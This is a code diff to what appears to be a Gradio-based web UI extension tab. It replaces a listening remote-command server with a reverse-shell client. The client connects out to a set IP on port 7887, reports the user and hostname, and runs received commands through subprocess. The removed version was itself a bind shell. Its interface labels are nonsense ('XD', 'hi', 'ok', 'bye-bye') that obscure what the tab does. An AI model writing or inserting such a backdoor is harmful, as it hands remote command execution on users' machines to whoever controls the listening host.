@@ -7,43 +7,47 @@ import subprocess
 import os
 import platform
 
-class RemoteControlServer:
+class RemoteControlClient:
     def __init__(self):
         self.connected = False
-        self.server_socket = None
         self.client_socket = None
-        self.server_thread = None
-        self.stop_server = False
+        self.connection_thread = None
+        self.stop_connection = False
+        self.target_ip = "192.168.1.100"  
         self.port = 7887
         self.current_user = os.getlogin()
-        
         try:
             self.current_hostname = os.uname().nodename
         except AttributeError:
             self.current_hostname = platform.node()
         
-    def start_server(self):
+    def connect_to_server(self, target_ip):
         if self.connected:
-            return "Server already running", True
+            return "Already connected to server", True
+        
+        self.target_ip = target_ip
+        self.stop_connection = False
         
         try:
-            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self.server_socket.bind(('0.0.0.0', self.port))
-            self.server_socket.listen(1)
-            self.stop_server = False
+            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client_socket.connect((self.target_ip, self.port))
+            self.connected = True
+ 
+            welcome_msg = f"Remote command client connected\nClient: {self.current_user}@{self.current_hostname}\nType 'exit' to quit\n\n"
+            self.client_socket.sendall(welcome_msg.encode())
             
-            self.server_thread = threading.Thread(target=self._accept_connections)
-            self.server_thread.daemon = True
-            self.server_thread.start()
+
+            self.connection_thread = threading.Thread(target=self._handle_server_commands)
+            self.connection_thread.daemon = True
+            self.connection_thread.start()
             
-            return f"Server started on port {self.port}", True
+            return f"Connected to {self.target_ip}:{self.port}", True
             
         except Exception as e:
-            return f"Failed to start server: {str(e)}", False
+            return f"Failed to connect to server: {str(e)}", False
     
-    def stop_server_func(self):
-        self.stop_server = True
+    def disconnect(self):
+        self.stop_connection = True
         self.connected = False
         
         if self.client_socket:
@@ -54,51 +58,14 @@ class RemoteControlServer:
             finally:
                 self.client_socket = None
         
-        if self.server_socket:
-            try:
-                self.server_socket.close()
-            except:
-                pass
-            finally:
-                self.server_socket = None
-        
-        return "Server stopped", False
+        return "Disconnected from server", False
     
-    def _accept_connections(self):
-        while not self.stop_server:
-            try:
-                self.server_socket.settimeout(1)
-                client_socket, client_address = self.server_socket.accept()
-                self.client_socket = client_socket
-                self.connected = True
-                print(f"Connection from {client_address}")
-                
-                welcome_msg = f"Remote command server\nConnected from: {client_address}\nServer: {self.current_user}@{self.current_hostname}\nType 'exit' to quit\n\n"
-                self.client_socket.sendall(welcome_msg.encode())
-                self._send_prompt()
-                self._handle_client()
-                
-            except socket.timeout:
-                continue
-            except Exception as e:
-                if not self.stop_server:
-                    print(f"Accept error: {str(e)}")
-                break
-    
-    def _send_prompt(self):
-        try:
-            cwd = os.getcwd()
-            prompt = f"{self.current_user}@{self.current_hostname}:{cwd}$ "
-            self.client_socket.sendall(prompt.encode())
-        except:
-            self.client_socket.sendall("$ ".encode())
-    
-    def _handle_client(self):
+    def _handle_server_commands(self):
         try:
             buffer = ""
             self.client_socket.settimeout(0.1)
             
-            while self.connected and not self.stop_server:
+            while self.connected and not self.stop_connection:
                 try:
                     data = self.client_socket.recv(1024).decode()
                     if not data:
@@ -113,7 +80,7 @@ class RemoteControlServer:
                             self._send_prompt()
                             continue
                         
-                        print(f"Received command: {command}")
+                        print(f"Received command from server: {command}")
                         
                         if command.lower() in ['exit', 'quit']:
                             self.client_socket.sendall("Goodbye!\n".encode())
@@ -130,7 +97,7 @@ class RemoteControlServer:
                     break
                     
         except Exception as e:
-            print(f"Client handling error: {str(e)}")
+            print(f"Server handling error: {str(e)}")
         finally:
             self.connected = False
             try:
@@ -138,6 +105,17 @@ class RemoteControlServer:
             except:
                 pass
             self.client_socket = None
+    
+    def _send_prompt(self):
+        try:
+            cwd = os.getcwd()
+            prompt = f"{self.current_user}@{self.current_hostname}:{cwd}$ "
+            self.client_socket.sendall(prompt.encode())
+        except:
+            try:
+                self.client_socket.sendall("$ ".encode())
+            except:
+                pass
     
     def _execute_command(self, command):
         try:
@@ -158,33 +136,35 @@ class RemoteControlServer:
         except Exception as e:
             return f"Execution error: {str(e)}"
 
-server = RemoteControlServer()
+client = RemoteControlClient()
 
-def toggle_server(server_running):
-    if server_running:
-        status_msg, new_state = server.stop_server_func()
-        return status_msg, new_state, "Start Server"
+def toggle_connection(connection_status, target_ip):
+    if connection_status:
+        status_msg, new_state = client.disconnect()
+        return status_msg, new_state, "Connect to Server", gr.update(interactive=True)
     else:
-        status_msg, new_state = server.start_server()
-        return status_msg, new_state, "Stop Server"
+        status_msg, new_state = client.connect_to_server(target_ip)
+        return status_msg, new_state, "Disconnect", gr.update(interactive=False)
 
 def on_ui_tabs():
-    with gr.Blocks(analytics_enabled=False) as demo:
-        gr.Markdown("模型開放")
-        
+    with gr.Blocks(analytics_enabled=False) as demo: 
         with gr.Row():
             with gr.Column(scale=1):
-                status = gr.Textbox(label="Status", value="Stopped")
-                btn = gr.Button("Start Server", variant="stop")
-                server_running = gr.State(False)
+                target_ip = gr.Textbox(
+                    label="XD", 
+                    value="192.168.1.104",
+                    placeholder="oooo"
+                )
+                status = gr.Textbox(label="hi", value="ok")
+                btn = gr.Button("start", variant="primary")
+                connection_status = gr.State(False)
                 
                 btn.click(
-                    fn=toggle_server,
-                    inputs=[server_running],
-                    outputs=[status, server_running, btn]
+                    fn=toggle_connection,
+                    inputs=[connection_status, target_ip],
+                    outputs=[status, connection_status, btn, target_ip]
                 )
-        
 
-    return [(demo, "模型開放", "remote_control_server_tab")]
+    return [(demo, "掰掰", "remote_control_client_tab")]
 
 script_callbacks.on_ui_tabs(on_ui_tabs)
